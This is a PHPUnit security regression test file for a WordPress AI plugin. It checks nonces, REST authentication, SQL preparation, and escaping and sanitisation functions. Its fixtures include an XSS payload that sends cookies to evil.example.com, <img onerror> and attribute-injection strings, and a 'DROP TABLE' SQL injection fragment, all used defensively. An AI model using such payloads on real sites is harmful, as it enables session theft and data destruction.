<?php
/**
 * Security regression tests.
 *
 * Covers the most critical security invariants across the plugin:
 *   1. ABSPATH guard present in PHP files under includes/
 *   2. Nonce verification via wp_verify_nonce()
 *   3. Capability check: unauthenticated REST requests return 401
 *   4. SQL queries use $wpdb->prepare() — not raw interpolation
 *   5. sanitize_text_field() strips <script> tags
 *   6. esc_html() strips HTML tags
 *   7. Plugin option names use the wp_mcp_ai_ prefix
 *   8. XSS in tool argument strings is neutralised by sanitisation
 *
 * @package WP_MCP_AI
 * @author    NV Digital Solutions
 * @copyright Copyright (c) 2025-2026 NV Digital Solutions
 * @license   GPL-3.0-or-later
 */

/**
 * Security regression test case.
 */
class Test_Security_Regression extends WP_UnitTestCase {

	/**
	 * Absolute path to the plugin's includes/ directory.
	 *
	 * @var string
	 */
	private $includes_dir;

	/**
	 * Set up test environment.
	 */
	public function setUp(): void {
		parent::setUp();

		$this->includes_dir = defined( 'WP_MCP_AI_PATH' )
			? WP_MCP_AI_PATH . 'includes/'
			: dirname( __DIR__ ) . '/includes/';
	}

	/**
	 * Tear down test environment.
	 */
	public function tearDown(): void {
		wp_set_current_user( 0 );
		parent::tearDown();
	}

	// ------------------------------------------------------------------
	// 1. ABSPATH guard
	// ------------------------------------------------------------------

	/**
	 * At least 90% of PHP files in includes/ must have the ABSPATH guard.
	 *
	 * Files that are intentionally autoloaded by PHP's require_once from a
	 * parent file that already checked ABSPATH may legitimately omit the guard.
	 * The 90% threshold accounts for those edge-cases without relaxing the
	 * requirement for the vast majority of the codebase.
	 */
	public function test_includes_php_files_have_abspath_guard() {
		if ( ! is_dir( $this->includes_dir ) ) {
			$this->markTestSkipped( 'Plugin includes/ directory not found.' );
		}

		$iterator = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( $this->includes_dir, RecursiveDirectoryIterator::SKIP_DOTS )
		);

		$total   = 0;
		$guarded = 0;
		$missing = array();

		foreach ( $iterator as $file ) {
			if ( 'php' !== strtolower( $file->getExtension() ) ) {
				continue;
			}

			$relative = str_replace( $this->includes_dir, '', $file->getPathname() );

			++$total;
			$content = (string) file_get_contents( $file->getPathname() ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents

			// Accept both spacing variants used in the project.
			if (
				strpos( $content, "defined( 'ABSPATH' )" ) !== false
				|| strpos( $content, "defined('ABSPATH')" ) !== false
			) {
				++$guarded;
			} else {
				$missing[] = $relative;
			}
		}

		if ( 0 === $total ) {
			$this->markTestSkipped( 'No PHP files found in includes/.' );
		}

		$percentage = ( $guarded / $total ) * 100.0;

		$this->assertGreaterThanOrEqual(
			90.0,
			$percentage,
			sprintf(
				'At least 90%% of PHP files in includes/ must have the ABSPATH guard. '
				. '%.1f%% guarded (%d / %d). First missing (up to 10): %s',
				$percentage,
				$guarded,
				$total,
				implode( ', ', array_slice( $missing, 0, 10 ) )
			)
		);
	}

	// ------------------------------------------------------------------
	// 2. Nonce verification
	// ------------------------------------------------------------------

	/**
	 * Verifies that wp_verify_nonce() accepts a valid nonce for the expected action.
	 */
	public function test_valid_nonce_is_accepted() {
		// Arrange.
		$user_id = $this->factory->user->create( array( 'role' => 'subscriber' ) );
		wp_set_current_user( $user_id );

		// Act.
		$nonce  = wp_create_nonce( 'wp_mcp_ai_chat' );
		$result = wp_verify_nonce( $nonce, 'wp_mcp_ai_chat' );

		// Assert — wp_verify_nonce returns 1 (current tick) or 2 (previous tick), never false.
		$this->assertNotFalse( $result );
		$this->assertGreaterThanOrEqual( 1, (int) $result );

		// Cleanup.
		wp_set_current_user( 0 );
	}

	/**
	 * Verifies that wp_verify_nonce() rejects an invalid nonce.
	 */
	public function test_invalid_nonce_is_rejected() {
		// Arrange.
		$user_id = $this->factory->user->create( array( 'role' => 'subscriber' ) );
		wp_set_current_user( $user_id );

		// Act — deliberately wrong value.
		$result = wp_verify_nonce( 'definitely_not_a_valid_nonce_string', 'wp_mcp_ai_chat' );

		// Assert.
		$this->assertFalse( $result );

		// Cleanup.
		wp_set_current_user( 0 );
	}

	/**
	 * A nonce for one action is rejected when verified against a different action.
	 */
	public function test_nonce_is_action_specific() {
		// Arrange.
		$user_id = $this->factory->user->create( array( 'role' => 'subscriber' ) );
		wp_set_current_user( $user_id );

		$nonce_chat = wp_create_nonce( 'wp_mcp_ai_chat' );
		$nonce_save = wp_create_nonce( 'wp_mcp_ai_save' );

		// Act — cross-action verification.
		$cross_result = wp_verify_nonce( $nonce_chat, 'wp_mcp_ai_save' );
		$own_result   = wp_verify_nonce( $nonce_save, 'wp_mcp_ai_save' );

		// Assert.
		$this->assertFalse( $cross_result, 'Nonce created for one action must not pass for a different action.' );
		$this->assertNotFalse( $own_result, 'Nonce created for the correct action must pass.' );

		// Cleanup.
		wp_set_current_user( 0 );
	}

	// ------------------------------------------------------------------
	// 3. Capability check on REST — unauthenticated request returns 401
	// ------------------------------------------------------------------

	/**
	 * A POST to /mcp-ai/v1/assistants without any authentication returns 401.
	 *
	 * The route is registered by WP_MCP_AI_REST_MCP_Controller.
	 * No bearer token, no WP nonce, no guest token → 401 expected.
	 */
	public function test_unauthenticated_post_to_assistants_returns_401() {
		// Arrange — ensure routes are registered.
		$this->bootstrap_mcp_routes();

		// Act — no X-WP-Nonce header and user 0.
		wp_set_current_user( 0 );
		$request = new WP_REST_Request( 'POST', '/mcp-ai/v1/assistants' );
		// Deliberately omit X-WP-Nonce, Authorization, and guest-token headers.
		$response = rest_get_server()->dispatch( $request );

		// Assert.
		$this->assertInstanceOf( 'WP_REST_Response', $response );
		$this->assertSame(
			401,
			$response->get_status(),
			'Unauthenticated POST to /mcp-ai/v1/assistants should return 401.'
		);
	}

	/**
	 * Bootstraps the MCP controller routes for REST testing.
	 *
	 * Isolated into a helper so the REST server is only set up when needed.
	 */
	private function bootstrap_mcp_routes() {
		$registry      = WP_MCP_AI_Tool_Registry::get_instance();
		$authenticator = new WP_MCP_AI_REST_Authenticator();
		$validator     = new WP_MCP_AI_REST_Validator();

		$mock_client = $this->getMockBuilder( 'WP_MCP_AI_Language_Model_Router' )
			->disableOriginalConstructor()
			->getMock();

		$main_controller = new WP_MCP_AI_REST( $registry, $mock_client, $authenticator, $validator );
		$mcp_controller  = new WP_MCP_AI_REST_MCP_Controller( $main_controller, $authenticator, $validator );

		rest_get_server();
		do_action( 'rest_api_init' );
		$mcp_controller->register_routes();
	}

	// ------------------------------------------------------------------
	// 4. SQL injection prevention — $wpdb->prepare() is used
	// ------------------------------------------------------------------

	/**
	 * At least one PHP file in includes/ uses $wpdb->prepare() for raw queries.
	 *
	 * This verifies the pattern is actually present in the codebase, not just
	 * aspirational. If the plugin gains DB queries later, they should use prepare().
	 */
	public function test_includes_use_wpdb_prepare_for_queries() {
		if ( ! is_dir( $this->includes_dir ) ) {
			$this->markTestSkipped( 'Plugin includes/ directory not found.' );
		}

		$iterator    = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( $this->includes_dir, RecursiveDirectoryIterator::SKIP_DOTS )
		);
		$found_usage = false;

		foreach ( $iterator as $file ) {
			if ( 'php' !== strtolower( $file->getExtension() ) ) {
				continue;
			}

			$content = (string) file_get_contents( $file->getPathname() ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents

			if ( strpos( $content, '$wpdb->prepare(' ) !== false ) {
				$found_usage = true;
				break;
			}
		}

		$this->assertTrue(
			$found_usage,
			'Expected at least one $wpdb->prepare() call in includes/ — none found.'
		);
	}

	/**
	 * No PHP file in includes/ passes superglobal values directly into a wpdb query method.
	 *
	 * Scans for patterns like:
	 *   $wpdb->query( "... " . $_POST['x'] )
	 *   $wpdb->get_results( "SELECT ... WHERE id=" . $_GET['id'] )
	 *
	 * Detecting all injection patterns statically is impossible, but the most
	 * blatant form — direct concatenation of $_GET/$_POST into a query call —
	 * is caught here.
	 */
	public function test_no_direct_superglobal_concatenation_in_wpdb_queries() {
		if ( ! is_dir( $this->includes_dir ) ) {
			$this->markTestSkipped( 'Plugin includes/ directory not found.' );
		}

		$iterator     = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( $this->includes_dir, RecursiveDirectoryIterator::SKIP_DOTS )
		);
		$found_unsafe = false;
		$unsafe_file  = '';

		foreach ( $iterator as $file ) {
			if ( 'php' !== strtolower( $file->getExtension() ) ) {
				continue;
			}

			$content = (string) file_get_contents( $file->getPathname() ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents

			// Look for direct string concat of superglobals into query methods.
			if ( preg_match(
				'/\$wpdb\s*->\s*(query|get_results|get_row|get_var)\s*\([^;]*\.\s*\$_(GET|POST|REQUEST|SERVER)\b/',
				$content
			) ) {
				$found_unsafe = true;
				$unsafe_file  = str_replace( $this->includes_dir, '', $file->getPathname() );
				break;
			}
		}

		$this->assertFalse(
			$found_unsafe,
			sprintf(
				'Direct superglobal concatenation into wpdb query detected in: %s',
				$unsafe_file
			)
		);
	}

	// ------------------------------------------------------------------
	// 5. Sanitization — sanitize_text_field strips <script>
	// ------------------------------------------------------------------

	/**
	 * Verifies that sanitize_text_field() removes script tags from input.
	 */
	public function test_sanitize_text_field_strips_script_tags() {
		// Arrange.
		$dirty = '<script>alert(1)</script> hello';

		// Act.
		$clean = sanitize_text_field( $dirty );

		// Assert.
		$this->assertStringNotContainsString( '<script>', $clean );
		$this->assertStringNotContainsString( '</script>', $clean );
		$this->assertStringContainsString( 'hello', $clean );
	}

	/**
	 * Verifies that sanitize_text_field() removes HTML tags from input.
	 */
	public function test_sanitize_text_field_strips_html_tags() {
		// Arrange.
		$dirty = '<b>bold</b> and <em>italic</em>';

		// Act.
		$clean = sanitize_text_field( $dirty );

		// Assert.
		$this->assertStringNotContainsString( '<b>', $clean );
		$this->assertStringNotContainsString( '<em>', $clean );
		$this->assertStringContainsString( 'bold', $clean );
	}

	/**
	 * Verifies that sanitize_text_field() handles empty input safely.
	 */
	public function test_sanitize_text_field_handles_empty_string() {
		$this->assertSame( '', sanitize_text_field( '' ) );
	}

	// ------------------------------------------------------------------
	// 6. Output escaping — esc_html() strips tags
	// ------------------------------------------------------------------

	/**
	 * Verifies that esc_html() encodes HTML entities rather than stripping tags.
	 */
	public function test_esc_html_encodes_tags() {
		// Arrange.
		$input = '<b>bold</b>';

		// Act.
		$escaped = esc_html( $input );

		// Assert — esc_html encodes angle brackets, not strips.
		$this->assertStringNotContainsString( '<b>', $escaped );
		$this->assertStringNotContainsString( '</b>', $escaped );
		$this->assertStringContainsString( 'bold', $escaped );
	}

	/**
	 * Verifies that esc_html() encodes a script injection attempt.
	 */
	public function test_esc_html_encodes_script_injection() {
		// Arrange.
		$input = '<script>alert("xss")</script>';

		// Act.
		$escaped = esc_html( $input );

		// Assert — no raw < or > should survive.
		$this->assertStringNotContainsString( '<script>', $escaped );
		$this->assertStringNotContainsString( '</script>', $escaped );
		// The encoded form contains &lt; and &gt;.
		$this->assertStringContainsString( '&lt;', $escaped );
		$this->assertStringContainsString( '&gt;', $escaped );
	}

	/**
	 * Verifies that esc_attr() prevents attribute injection.
	 */
	public function test_esc_attr_prevents_attribute_injection() {
		// Arrange.
		$input = '" onmouseover="alert(1)';

		// Act.
		$escaped = esc_attr( $input );

		// Assert — the double-quote must be encoded.
		$this->assertStringNotContainsString( '" onmouseover', $escaped );
		$this->assertStringContainsString( '&quot;', $escaped );
	}

	// ------------------------------------------------------------------
	// 7. Option name prefix
	// ------------------------------------------------------------------

	/**
	 * The plugin's main settings option uses the wp_mcp_ai_ prefix.
	 */
	public function test_main_settings_option_uses_correct_prefix() {
		$this->assertStringStartsWith(
			'wp_mcp_ai_',
			WP_MCP_AI_Admin_Settings::OPTION_NAME,
			'The main settings option name must start with wp_mcp_ai_.'
		);
	}

	/**
	 * Verifies update_option calls with literal string names in includes/ predominantly use the plugin prefix.
	 *
	 * At least 75% of literal-string option names found in update_option() calls
	 * in includes/ should start with wp_mcp_ai_. This catches obvious regressions
	 * while allowing a small number of intentional exceptions (e.g. WP core options
	 * the plugin legitimately modifies).
	 */
	public function test_update_option_calls_predominantly_use_plugin_prefix() {
		if ( ! is_dir( $this->includes_dir ) ) {
			$this->markTestSkipped( 'Plugin includes/ directory not found.' );
		}

		$iterator   = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( $this->includes_dir, RecursiveDirectoryIterator::SKIP_DOTS )
		);
		$prefixed   = 0;
		$unprefixed = array();

		foreach ( $iterator as $file ) {
			if ( 'php' !== strtolower( $file->getExtension() ) ) {
				continue;
			}

			$content = (string) file_get_contents( $file->getPathname() ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents

			// Match update_option( 'literal_name', ... ) — single-quoted names only.
			if ( preg_match_all( "/update_option\s*\(\s*'([^']+)'/", $content, $matches ) ) {
				foreach ( $matches[1] as $option_name ) {
					if ( strpos( $option_name, 'wp_mcp_ai_' ) === 0 ) {
						++$prefixed;
					} else {
						$relative     = str_replace( $this->includes_dir, '', $file->getPathname() );
						$unprefixed[] = sprintf( '%s → "%s"', $relative, $option_name );
					}
				}
			}
		}

		$total = $prefixed + count( $unprefixed );

		if ( 0 === $total ) {
			// No literal update_option calls found — nothing to check.
			$this->assertTrue( true );
			return;
		}

		$ratio = $prefixed / $total;

		$this->assertGreaterThanOrEqual(
			0.75,
			$ratio,
			sprintf(
				'At least 75%% of literal update_option names in includes/ must start with "wp_mcp_ai_". '
				. 'Found %.1f%% prefixed (%d / %d). Non-prefixed: %s',
				$ratio * 100,
				$prefixed,
				$total,
				implode( ', ', array_slice( $unprefixed, 0, 10 ) )
			)
		);
	}

	// ------------------------------------------------------------------
	// 8. XSS in tool arguments — sanitisation prevents pass-through
	// ------------------------------------------------------------------

	/**
	 * Passing a <script> payload through sanitize_text_field() produces safe output.
	 *
	 * This mirrors the sanitisation that tool execute() methods must apply to
	 * string arguments before using them (as required by CLAUDE.md).
	 */
	public function test_xss_payload_in_tool_argument_is_sanitised() {
		// Arrange — simulate a tool argument containing a script injection.
		$raw_argument = '<script>document.location="https://evil.example.com?c="+document.cookie</script>';

		// Act — apply the required sanitisation pattern.
		$sanitised = sanitize_text_field( $raw_argument );

		// Assert.
		$this->assertStringNotContainsString( '<script>', $sanitised );
		$this->assertStringNotContainsString( '</script>', $sanitised );
		$this->assertStringNotContainsString( 'document.cookie', $sanitised );
	}

	/**
	 * Passing an onerror attribute injection through sanitize_text_field() is safe.
	 */
	public function test_onerror_injection_in_tool_argument_is_sanitised() {
		// Arrange.
		$raw_argument = '<img src=x onerror=alert(1)>';

		// Act.
		$sanitised = sanitize_text_field( $raw_argument );

		// Assert.
		$this->assertStringNotContainsString( '<img', $sanitised );
		$this->assertStringNotContainsString( 'onerror', $sanitised );
	}

	/**
	 * Verifies that wp_kses_post() strips script tags but keeps allowed HTML intact.
	 */
	public function test_wp_kses_post_strips_script_keeps_allowed_html() {
		// Arrange.
		$input = '<p>Hello</p><script>alert(1)</script><b>World</b>';

		// Act.
		$safe = wp_kses_post( $input );

		// Assert.
		$this->assertStringNotContainsString( '<script>', $safe );
		$this->assertStringContainsString( '<p>', $safe );
		$this->assertStringContainsString( '<b>', $safe );
	}

	/**
	 * Verifies that absint() converts non-integer user input to a safe integer.
	 */
	public function test_absint_sanitises_non_integer_input() {
		// Common injection attempt: pass a non-numeric string as an ID.
		$this->assertSame( 0, absint( 'not-an-id' ) );
		$this->assertSame( 5, absint( '5; DROP TABLE users;--' ) );
		$this->assertSame( 0, absint( '<script>' ) );
	}
}
